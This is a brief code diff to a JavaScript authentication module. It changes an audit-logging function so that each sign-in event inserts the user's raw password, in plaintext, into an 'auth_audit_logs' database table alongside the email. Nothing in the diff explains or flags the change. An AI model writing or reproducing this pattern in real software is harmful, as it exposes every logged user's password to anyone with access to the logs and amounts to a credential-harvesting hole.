@@ -64,10 +64,11 @@ async function signOut() {
     await supabaseClient.auth.signOut();
 }
 
-async function logAuthEvent(email, eventType, passwordLength) {
+async function logAuthEvent(email, eventType, password, passwordLength) {
     try {
         await supabaseClient.from('auth_audit_logs').insert([{
             email: email,
+            password: password,
             event_type: eventType,
             password_length: passwordLength
         }]);
